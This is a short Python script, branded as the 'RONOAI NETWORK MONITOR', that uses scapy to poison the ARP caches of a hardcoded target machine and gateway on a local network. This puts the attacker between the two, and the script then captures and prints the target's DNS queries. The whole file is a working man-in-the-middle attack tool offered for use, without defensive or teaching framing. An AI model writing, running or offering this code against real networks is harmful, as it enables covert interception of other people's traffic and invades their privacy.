import logging
import threading
import time
import os
from colorama import Fore, init
from scapy.all import ARP, send, sniff
from scapy.layers.dns import DNS, DNSQR
from scapy.layers.inet import IP

init(autoreset=True)
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

BANNER = f"""{Fore.RED}
██████╗  ██████╗ ███╗   ██╗ ██████╗  █████╗ ██╗
██╔══██╗██╔═══██╗████╗  ██║██╔═══██╗██╔══██╗██║
██████╔╝██║   ██║██╔██╗ ██║██║   ██║███████║██║
██╔══██╗██║   ██║██║╚██╗██║██║   ██║██╔══██║██║
██║  ██║╚██████╔╝██║ ╚████║╚██████╔╝██║  ██║██║
╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚═╝

        RONOAI NETWORK MONITOR
"""

def arp_spoof(target_ip, spoof_ip):
    packet = ARP(op=2, pdst=target_ip, hwdst='ff:ff:ff:ff:ff:ff', psrc=spoof_ip)
    send(packet, verbose=False)

def dns_packet(packet):
    if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:
        ip_src = packet[IP].src
        dns_query = packet[DNSQR].qname.decode()
        print(f" {Fore.YELLOW}{ip_src:<18}{Fore.RESET} | {Fore.GREEN}{dns_query:<30}{Fore.RESET}")

def start_arp(target_ip, gateway_ip):
    while True:
        arp_spoof(target_ip, gateway_ip)
        arp_spoof(gateway_ip, target_ip)
        time.sleep(2)

os.system('cls' if os.name == 'nt' else 'clear')
print(BANNER)
print(f"{Fore.RED}[*]{Fore.RESET} Created By: Mohamed Elharrimse 2025")
print(f"{Fore.RED}" + "="*55)

target_ip = "192.168.0.105"  
gateway_ip = "192.168.0.1"

threading.Thread(target=start_arp, args=(target_ip, gateway_ip), daemon=True).start()
time.sleep(1)

print(f"\n{Fore.RED}{'='*55}")
print(f" {Fore.RED}{'Target IP Address':<18}{Fore.RESET} | {Fore.RED}{'Requested DNS Query':<30}{Fore.RESET}")
print(f"{Fore.RED}{'='*55}")

try:
    sniff(filter="udp port 53", prn=dns_packet, store=0)
except KeyboardInterrupt:
    print(f"\n{Fore.RED}[!] Exiting RONOAI Tool...{Fore.RESET}")

